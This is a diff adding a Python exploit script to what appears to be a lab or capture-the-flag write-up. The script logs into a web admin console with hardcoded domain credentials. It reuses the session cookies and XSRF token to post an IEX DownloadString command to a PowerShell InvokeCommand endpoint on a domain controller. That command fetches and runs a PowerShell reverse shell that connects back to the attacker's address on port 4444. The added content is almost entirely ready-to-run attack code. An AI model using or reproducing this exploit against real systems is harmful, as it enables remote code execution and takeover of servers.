@@ -450,3 +450,121 @@ strict-transport-security: max-age=5184000; includeSubDomains; preload
 ![img](./img/Captura4.png)
 
 ![img](./img/Captura5.png)
+
+``` py
+
+# Exploit
+
+from playwright.sync_api import sync_playwright
+import requests
+from requests_ntlm import HttpNtlmAuth
+import urllib3
+import base64
+import subprocess
+
+urllib3.disable_warnings()
+
+url = "https://10.129.80.127:6600"
+
+username = 'DANGLINGTREE\\anderson.w'
+password = 'R3dT3am@Acc3ss#01'
+
+ip = '10.10.15.166'
+
+def get_session():
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True)
+        context = browser.new_context(ignore_https_errors=True)
+        page = context.new_page()
+
+        page.goto(url)
+        page.fill('#username', f'{username}')
+        page.fill('#password', f'{password}')
+        page.click('#submit')
+        page.wait_for_timeout(3000)
+
+        cookies = context.cookies()
+
+        browser.close()
+        return cookies
+
+
+def build_session(cookies):
+    session = requests.Session()
+    session.verify = False
+
+    for c in cookies:
+        session.cookies.set(c['name'], c['value'])
+
+    xsrf = session.cookies.get("XSRF-TOKEN")
+    session.headers.update({
+        "x-xsrf-token": xsrf or "",
+        "Content-Type": "application/json"
+    })
+
+    return session
+
+
+def explotation(session):
+
+
+    shell_ps1 = f"""$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', 4444)
+    $NetworkStream = $TCPClient.GetStream()
+    $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+    function WriteToStream ($String) {{
+        [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}}
+        $StreamWriter.Write($String + 'SHELL> ')
+        $StreamWriter.Flush()
+    }}
+    WriteToStream ''
+    while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{
+        $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+        $Output = try {{ Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $_ | Out-String }}
+        WriteToStream ($Output)
+    }}
+    $StreamWriter.Close()"""
+
+    with open("shell.ps1", "w") as file:
+
+          file.write(shell_ps1)
+
+    subprocess.Popen(["python3", "-m", "http.server", "8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    cmd = f"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:8080/shell.ps1')"
+
+    payload = {"properties": {"script": f"{cmd}"}}
+
+    try:
+
+        r = session.post(f"{url}/api/services/WinREST/Powershell/nodes/dc/InvokeCommand", json=payload)
+
+        print(r.status_code)
+        print(r.text)
+
+
+    except requests.exceptions.Timeout:
+
+                    print("Timeout")
+
+    except requests.exceptions.SSLError:
+
+                    print("SSL error")
+
+    except requests.exceptions.ConnectionError:
+
+                    print("Error: Can't connect to the server")
+
+
+    except Exception as e:
+
+                    print(f"Error: {e}")
+
+
+
+if __name__ == "__main__":
+
+         cookies = get_session()
+         session = build_session(cookies)
+         explotation(session)
+
+```
